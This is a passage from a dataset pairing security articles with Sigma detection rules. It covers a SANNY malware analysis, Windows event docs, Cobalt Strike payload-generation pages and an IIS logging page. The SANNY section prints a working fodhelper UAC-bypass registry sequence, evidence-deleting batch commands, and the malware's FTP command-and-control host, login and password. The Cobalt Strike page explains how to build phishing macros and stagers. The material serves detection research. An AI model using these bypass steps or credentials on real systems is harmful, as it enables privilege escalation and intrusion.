CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "Cab File Extraction Via Wusa.EXE From Potentially Suspicious Paths",
      "id": "c74c0390-3e20-41fd-a69a-128f0275a5ea",
      "related": [
        {
          "id": "59b39960-5f9d-4a49-9cef-1e4d2c1d0cb9",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract \".cab\" files using the \"/extract\" argument from potentially suspicious paths.\n",
      "references": [
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://www.echotrail.io/insights/search/wusa.exe/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-11-28",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "Image|endswith": "\\wusa.exe",
          "CommandLine|contains": "/extract:"
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\Appdata\\Local\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wusa_cab_files_extraction_from_susp_paths.yml"
  },
  "27": {
    "url": "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml"
  },
  "28": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794",
    "markdown": "# 4794(S, F): An attempt was made to set the Directory Services Restore Mode administrator password.\n\n**Article**\n**Date:** 09/07/2021\n\n```image\nAlt: Event 4794 illustration\nDescription: |\n  The image displays a Windows Event Properties window for Event ID 4794, which documents an attempt to set the Directory Services Restore Mode administrator password. The window is divided into sections providing detailed information: \n  - The 'General' section summarizes the event, including the Security ID (CONTOSO\\dadmin), Account Name (dadmin), Account Domain (CONTOSO), and Logon ID (0x36F67). \n  - The 'Additional Information' section lists the Caller Workstation (DC01) and the Status Code (0x0). \n  - At the bottom, log details include the Source (Microsoft Windows security auditing), Event ID (4794), and logged date (8/17/2015, 7:49:26 PM). The Event Log Online link is also present for more information.\nTranscription: |\n  An attempt was made to set the Directory Services Restore Mode administrator password.\n  \n  Subject:\n      Security ID:       CONTOSO\\admin\n      Account Name:      dadmin\n      Account Domain:    CONTOSO\n      Logon ID:         0x36F67\n  \n  Additional Information:\n      Caller Workstation: DC01\n      Status Code:       0x0\n  \n  Log Name:      Security\n  Source:        Microsoft Windows security auditing\n  Event ID:     4794\n  Logged:       8/17/2015 7:49:26 PM\n  Level:        Information\n  Task Category: User Account Management\n  Keywords:     Audit Success\n  User:         N/A\n  Computer:     DC01.contoso.local\n  OpCode:       Info\n  More Information: Event Log Online\n```\n\n**Subcategory:** Audit User Account Management\n\n**Event Description:**\nThis event generates every time Directory Services Restore Mode (DSRM) administrator password is changed.\nThis event generates only on domain controllers.\n\n> **Note**\n> For recommendations, see Security Monitoring Recommendations for this event.\n\n**Event XML:**\n```\n- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" />\n <EventID>4794</EventID>\n <Version>0</Version>\n <Level>0</Level>\n <Task>13824</Task>\n <Opcode>0</Opcode>\n <Keywords>0x8020000000000000</Keywords>\n <TimeCreated SystemTime=\"2015-08-18T02:49:26.087748900Z\" />\n <EventRecordID>172348</EventRecordID>\n <Correlation />\n <Execution ProcessID=\"520\" ThreadID=\"2964\" />\n <Channel>Security</Channel>\n <Computer>DC01.contoso.local</Computer>\n <Security />\n </System>\n- <EventData>\n <Data Name=\"SubjectUserSid\">S-1-5-21-3457937927-2839227994-823803824-1104</Data>\n <Data Name=\"SubjectUserName\">dadmin</Data>\n <Data Name=\"SubjectDomainName\">CONTOSO</Data>\n <Data Name=\"SubjectLogonId\">0x36f67</Data>\n <Data Name=\"Workstation\">DC01</Data>\n <Data Name=\"Status\">0x0</Data>\n </EventData>\n </Event>\n```\n\n**Required Server Roles:**\nActive Directory domain controller.\n\n**Minimum OS Version:**\nWindows Server 2008.\n\n**Event Versions:**\n0.\n\n**Field Descriptions:**\n\n**Subject:**\n- **Security ID** [Type = SID]:\n  SID of account that made an attempt to set Directory Services Restore Mode administrator password. Event Viewer automatically tries to resolve SIDs and show the account name. If the SID cannot be resolved, you will see the source data in the event.\n\n> **Note**\n> A **security identifier (SID)** is a unique value of variable length used to identify a trustee (security principal). Each account has a unique SID that is issued by an authority, such as an Active Directory domain controller, and stored in a security database. Each time a user logs on, the system retrieves the SID for that user from the database and places it in the access token for that user. The system uses the SID in the access token to identify the user in all subsequent interactions with Windows security. When a SID has been used as the unique identifier for a user or group, it cannot ever be used again to identify another user or group. For more information about SIDs, see Security identifiers.\n\n- **Account Name** [Type = UnicodeString]:\n  the name of the account that made an attempt to set Directory Services Restore Mode administrator password.\n\n- **Account Domain** [Type = UnicodeString]:\n  subject’s domain or computer name. Formats vary, and include the following:\n  - Domain NETBIOS name example: CONTOSO\n  - Lowercase full domain name: contoso.local\n  - Uppercase full domain name: CONTOSO.LOCAL\n  - For some well-known security principals, such as LOCAL SERVICE or ANONYMOUS LOGON, the value of this field is “NT AUTHORITY”.\n  - For local user accounts, this field will contain the name of the computer or device that this account belongs to, for example: “Win81”.\n\n- **Logon ID** [Type = HexInt64]:\n  hexadecimal value that can help you correlate this event with recent events that might contain the same Logon ID, for example, “4624: An account was successfully logged on.”\n\n**Additional Information:**\n- **Caller Workstation** [Type = UnicodeString]:\n  the name of computer account from which Directory Services Restore Mode (DSRM) administrator password change request was received. For example: “DC01”. If the change request was sent locally (from the same server) this field will have the same name as the computer account.\n\n- **Status Code** [Type = HexInt32]:\n  for Success events it has “0x0” value.\n\n## Security Monitoring Recommendations\n\nFor 4794(S, F): An attempt was made to set the Directory Services Restore Mode administrator password.\n- Always monitor 4794 events and trigger alerts when they occur.",
    "sigma_rule": {
      "title": "Password Change on Directory Service Restore Mode (DSRM) Account",
      "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51",
      "related": [
        {
          "id": "b61e87c0-50db-4b2e-8986-6a2be94b33b0",
          "type": "similar"
        }
      ],
      "status": "stable",
      "description": "Detects potential attempts made to set the Directory Services Restore Mode administrator password.\nThe Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers.\nAttackers may change the password in order to obtain persistence.\n",
      "references": [
        "https://adsecurity.org/?p=1714",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4794"
      ],
      "author": "Thomas Patzke",
      "date": "2017-02-19",
      "modified": "2020-08-23",
      "tags": [
        "attack.persistence",
        "attack.t1098"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4794
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Initial installation of a domain controller."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_susp_dsrm_password_change.yml"
  },
  "29": {
    "url": "https://www.cobaltstrike.com/help-windows-executable",
    "markdown": "# User-driven Attack Packages\n\nThe best attacks are not exploits. Rather, the best attacks take advantage of normal features to get code execution. **Cobalt Strike** makes it easy to setup several user-driven attacks. These attacks take advantage of listeners you’ve already setup. Navigate in the menu to **Payloads** and choose one of the following options.\n\n## HTML Application\n\nAn HTML Application is a Windows program written in HTML and an Internet Explorer supported scripting language. This package generates an HTML Application that runs a **Cobalt Strike** listener.\n\nNavigate to **Payloads -> HTML Application**.\n\n[Image Details:\n**Alt Text**: HTML Application Attack\n**Description**: The image displays a user interface for generating an HTML Application attack using Cobalt Strike. The window includes fields for entering a 'Listener' and selecting a 'Method' from a dropdown, with a 'Generate' button and a 'Help' button at the bottom. The text indicates that this package is intended to create an HTML application that runs a Cobalt Strike listener.\n**Transcription**:\nHTML Application Attack\n\nThis package generates an HTML application that runs\n\nListener: [          ]\nMethod: Executable v\n\n[Generate] [Help]]\n\n**figure 36 -** HTML Application Attack\n\nPress **Generate** to create the HTML Application.\n\n<iframe allowfullscreen=\"1\" frameborder=\"0\" height=\"315\" src=\"https://www.youtube.com/embed/8YgEjr7f4Ew\" width=\"420\"></iframe>\n\n## MS Office Macro\n\nThe Microsoft Office Macro tool generates a macro to embed into a Microsoft Word or Microsoft Excel document.\n\nNavigate to **Payloads -> MS Office Macro**.\n\n[Image Details:\n**Alt Text**: MS Office Macro\n**Description**: The image shows a user interface for the MS Office Macro tool, which is used to generate a VBA (Visual Basic for Applications) macro for embedding into Microsoft Word or Excel documents. The interface includes a text box labeled 'Listener,' a 'Generate' button, and a 'Help' button. There is descriptive text indicating that the package generates a VBA macro compatible with both x86 and x64 versions of Office on Windows.\n**Transcription**:\nMS Office Macro\n\nThis package generates a VBA macro that you may embed into a Microsoft Word or Excel document. This attack works in x86 and x64 Office on Windows.\n\nListener: [__________] [Generate] [Help]]\n\n**figure 37 -** MS Office Macro\n\nChoose a listener and press **Generate** to create the step-by-step instructions to embed your macro into a Microsoft Word or Excel document.\n\nThis attack works well when you can convince a user to run macros when they open your document.\n\n<iframe allowfullscreen=\"1\" frameborder=\"0\" height=\"315\" src=\"https://www.youtube.com/embed/OzekG1I-do0\" width=\"420\"></iframe>\n\n## Payload Generator\n\n**Cobalt Strike**'s Payload Generator outputs source code and artifacts to stage a **Cobalt Strike** listener onto a host. Think of this as the **Cobalt Strike** version of msfvenom.\n\nNavigate to **Payloads -> Stager Payload Generator**.\n\n[Image Details:\n**Alt Text**: Payload Generator\n**Description**: The image depicts a user interface of the Payload Generator feature from Cobalt Strike. It shows a dialog box with fields for inputting a 'Listener,' selecting an 'Output' type, and an option to generate a 'x64' payload. The interface includes buttons labeled 'Generate' and 'Help,' indicating functionality for creating a payload to stage a Cobalt Strike listener.\n**Transcription**:\nPayload Generator\n\nThis dialog generates a payload to stage a Cobalt Strike.\n\nListener: [                ]\nOutput: C [▼]\nx64: [✓] Use x64 payload\n\n[Generate] [Help]]\n\n**figure 38 -** Payload Generator\n\nPress **Generate** to create a Payload for the selected output type.\n\n<iframe allowfullscreen=\"1\" frameborder=\"0\" height=\"315\" src=\"https://www.youtube.com/embed/d0hgkaV-rr8\" width=\"420\"></iframe>\n\n## Payload Generator (stageless)\n\n**Cobalt Strike**'s Payload Generator outputs source code and artifacts, without a stager, to a **Cobalt Strike** listener onto a host.\n\nNavigate to **Payloads -> Stageless Payload Generator**.\n\n[Image Details:\n**Alt Text**: Stageless Payload Generator\n**Description**: The image depicts a user interface for the 'Payload Generator (Stageless)' feature in Cobalt Strike. It shows various fields for configuring the payload, including options for 'Listener', 'Guardrails', 'Output', 'Exit Function', 'System Call', 'HTTP Library', and a checkbox for 'x64' payload. A 'Generate' button and a 'Help' button are also visible. This interface is used to create a stageless artifact for penetration testing.\n**Transcription**:\nPayload Generator (Stageless)\nThis dialog exports a Cobalt Strike payload stage. Several output options are available.\n\nListener:          a-winhttp\nGuardrails:        \nOutput:            C\nExit Function:     Process\nSystem Call:       None\nHTTP Library:      wininet\nx64:               [x] Use x64 payload\n\n[Generate]  [Help]]\n\n**figure 39 -** Stageless Payload Generator\n\nPress **Generate** to create a stageless artifact.\n\n## Windows Executable\n\nThis package generates a Windows executable artifact that delivers a payload stager.\n\nNavigate to **Payloads -> Windows Stager Payload**.\n\n[Image Details:\n**Alt Text**: Windows Executable\n**Description**: The image depicts a dialog box from the Cobalt Strike application, titled 'Windows Executable.' This interface allows users to generate a Windows executable file. It includes fields for 'Listener,' 'Output' (set to 'Windows EXE'), options for selecting a 64-bit payload (x64), and a checkbox to sign the executable file. At the bottom, there are buttons labeled 'Generate' and 'Help,' indicating user actions available in this dialog.\n**Transcription**:\nWindows Executable\n\nThis dialog generates a Windows executable. Use Cob alt Strike Arsenal scripts (Help -> Arsenal) to customize this process.\n\nListener: [                ]\nOutput: Windows EXE [▼]\nx64: [✓] Use x64 payload\nSign: [ ] Sign executable file\n\n[Generate] [Help]]\n\n**figure 41 -** Windows Executable\n\nThis package provides the following output options:\n\nPress **Generate** to create a payload stager artifact.\n\n**Cobalt Strike** uses its Artifact Kit to generate this output.\n\n## Windows Executable (Stageless)\n\nThis package exports Beacon, without a stager, as an executable, service executable, 32-bit DLL, or 64-bit DLL. A payload artifact that does not use a stager is called a stageless artifact. This package also has a PowerShell option to export Beacon as a PowerShell script and a raw option to export Beacon as a blob of position independent code.\n\nNavigate to **Payloads -> Windows Stageless Payload**.\n\n[Image Details:\n**Alt Text**: Windows Stageless Executable\n**Description**: The image displays a user interface for generating a stageless executable payload using Cobalt Strike. It includes fields for configuring various options such as Listener, Output type, Exit Function, System Call, and HTTP Library. There are checkboxes for using a 64-bit payload and signing the executable file. The interface allows users to customize their export settings and includes buttons for 'Generate' and 'Help'.\n**Transcription**:\nWindows Executable (Stageless)\n\nExport a stageless Beacon as a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process.\n\nListener:              a-winhttp\nGuardrails:            \nOutput:                Windows EXE\nExit Function:         Process\nSystem Call:           None\nHTTP Library:          wininet\nx64:                   [x] Use x64 payload\nSign:                  [x] Sign executable file\n\n[Generate]   [Help]]\n\n**figure 42 -** Windows Stageless Executable\n\nThis package provides the following output options:\n\nPress **Generate** to create a stageless artifact.\n\n**Cobalt Strike** uses its Artifact Kit to generate this output.\n\n## Windows Executable (Stageless) Variants\n\nThis option generates all of the stageless payloads (in x86 and x64) for all of the configured listeners.\n\nNavigate to **Payloads -> Windows Stageless Generate All Payloads**.\n\n[Image Details:\n**Alt Text**: Windows Stageless Executable Variants\n**Description**: The image displays a user interface for generating Windows Executable (Stageless) variants. It includes fields for specifying the folder destination, selecting a system call method (with 'Indirect' as the chosen option), and an HTTP library selection. There is also a checkbox to sign the executable files. A 'Generate' button is prominently featured, indicating the action to create the stageless payloads.\n**Transcription**:\nWindows Executable (Stageless) Variants\n\nGenerate x86 and x64 stageless payloads for each listener, save to a specified folder, set System Call method, and optionally sign the EXE and DLL files.\n\nFolder: /home/csdev\nSystem Call: Indirect\nHTTP Library: \nSign: [ ] Sign the executable files\n\n[Generate] [Help]]\n\n**figure 44 -** Windows Stageless Executable Variants\n\nPress **Generate** to create a stageless artifact.\n\n<iframe allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen=\"1\" frameborder=\"0\" height=\"315\" src=\"https://www.youtube.com/embed/yTIeeMVetfw\" width=\"560\"></iframe>",
    "sigma_rule": {
      "title": "CobaltStrike Load by Rundll32",
      "id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
      "status": "test",
      "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
      "references": [
        "https://www.cobaltstrike.com/help-windows-executable",
        "https://redcanary.com/threat-detection-report/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
      ],
      "author": "Wojciech Lesicki",
      "date": "2021-06-01",
      "modified": "2022-09-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_rundll": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": [
              "rundll32.exe",
              "rundll32 "
            ]
          }
        ],
        "selection_params": {
          "CommandLine|contains": ".dll",
          "CommandLine|endswith": [
            " StartW",
            ",StartW"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml"
  },
  "30": {
    "url": "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/",
    "markdown": "# Default Log File Settings for Web Sites <logFile>\n\n## Overview\n\nThe `<logFile>` element of the `<siteDefaults>` element contains attributes that allow you to configure default logging for a site on IIS 7 and later.\n\nFor example, you can enable or disable logging, configure the format of the IIS log file, specify the categories of information to store in the log file, and change the directory where the log file is stored. You can also use the `<logFile>` element to control how often IIS creates a new log file based either on log file size or time interval and the maximum size (in bytes) that a log file can become.\n\nBy default, IIS 7 and later uses the World Wide Web Consortium (W3C) log file format. You can change this setting by modifying the **logFormat** attribute to **IIS**, **NCSA**, or **Custom**.\n\n> **Note**\n> ODBC logging is implemented as a custom logging module in IIS 7 and later. As a result, enabling and configuring ODBC logging in IIS 7 and later consists of two separate actions:\n>\n> - Setting the ODBC logging attributes in the <odbcLogging> element. These attributes specify the System Data Source Name (DSN), table name, user name, and password for the ODBC connection.\n> - Setting the correct custom logging attributes in `<logFile>` element. These attributes must set the log file format to \"Custom\" and the custom log plug-in class ID to \"{FF16065B-DE82-11CF-BC0A-00AA006111E0}\".\n\nFor more information about ODBC logging, see the <odbcLogging> element.\n\nYou can define the categories of information that IIS logs by editing the **logExtFileFlags** attribute. The default values are **Date**, **Time**, **ClientIP**, **UserName**, 